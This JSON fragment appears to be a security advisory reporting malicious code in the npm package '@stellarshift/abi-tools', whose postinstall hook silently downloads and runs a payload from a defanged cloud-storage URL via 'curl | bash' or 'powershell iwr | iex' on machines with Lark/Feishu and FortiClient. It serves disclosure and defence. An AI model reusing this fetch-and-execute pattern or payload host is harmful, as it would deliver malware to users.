  "summary": "Malicious code in @stellarshift/abi-tools (npm)",
  "details": "The postinstall hook (scripts/postinstall.js) is a targeted dropper. It only activates on macOS/Windows machines that have both Lark/Feishu and FortiClient installed, then downloads a payload from hxxps://mexc-1258433570[.]cos[.]ap-beijing[.]myqcloud[.]com/abi-tool-damon and executes it via `curl -fsSL... | bash` (or `powershell iwr | iex` on Windows), running silently in the background with errors suppressed. The bundled index.js is a benign Ethereum ABI selector library; the malicious behaviour lives entirely in the install hook.",
